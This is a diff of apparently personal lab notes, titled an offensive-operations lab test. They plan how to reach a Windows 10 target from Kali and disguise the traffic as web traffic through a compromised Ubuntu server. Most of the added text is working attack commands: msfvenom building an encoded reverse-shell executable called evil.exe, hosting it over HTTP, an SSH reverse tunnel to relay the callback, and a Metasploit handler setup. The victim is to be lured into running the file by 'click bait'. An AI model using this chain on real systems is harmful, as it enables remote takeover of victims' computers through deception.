@@ -1,23 +1,44 @@
-Help:  
+OCO-lab test
 
-How to get access to <TARGET> and make it look like normal web traffic going to "compromised web-server"
+Goal:  
+How to get access to <TARGET> from [Kali] and make it look like normal web traffic from Windows 10 back to "compromised Web-Srvr."
+--See first diagram below.*
+
 Idea #1:
-	- MSFvenom (reverse-
- 
+--------
+1) From: kali [msfconsole]--
+	#> msfvenom -p windows/shell/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe LHOST=10.0.0.30 LPORT=5959 > evil.exe
+2) Host "evil.exe" on UbUntu-VM (/home/ubuntu/Public)
+	#> python3 -m http.server 8080
+3) Setup SSH Reverse Tunnel from Kali <--> UbUntu to receive the callback
+   From: kali
+   	#> ssh ubuntu@10.0.0.30 -R 5959:0.0.0.0:2960
+	
+* I think this will forward all traffic going to 10.0.0.30:5959 --> to my Kali (10.0.0.20:2960)  *
+	
+4) Await connection via Kali-msfconsole-multi/stage/handler
+   From: kali [msfconsole]--
+   	#> use exploit/multi/handler
+	#> set payload windows/shell/reverse_tcp
+	#> set LHOST 10.0.0.20
+	#> set LPORT 2960
+	
+5) Click bait and cross fingers?
+ 	
     Kali-VM			  UbUntu-VM			  Windows10-VM
   My attack VM 			 compromised Web-Srvr		  <TARGET>
  _______________		 _______________		 _______________
+|		|		| <click-bait>	|		|		|
+|	  start -------------------------------------------------->-|		|
 |		|		|		|		|		|
-|		|		|		|		|		|
-|		|		|		|		|		|
-|		|		|		|		|		|
+|   Finish |-<---------------------------------------------------		|
 |_______________|		|_______________|		|_______________|
-   10.0.0.20			     10.0.0.30			     10.0.0.40
+   10.0.0.20			     10.0.0.30			    10.0.0.40
 - kali 				- ubuntu			- user
-- password			- password			- password
 
 
-============================================================================================================
+===============================================================================================================================
+===============================================================================================================================
 
 
 ---------------------------
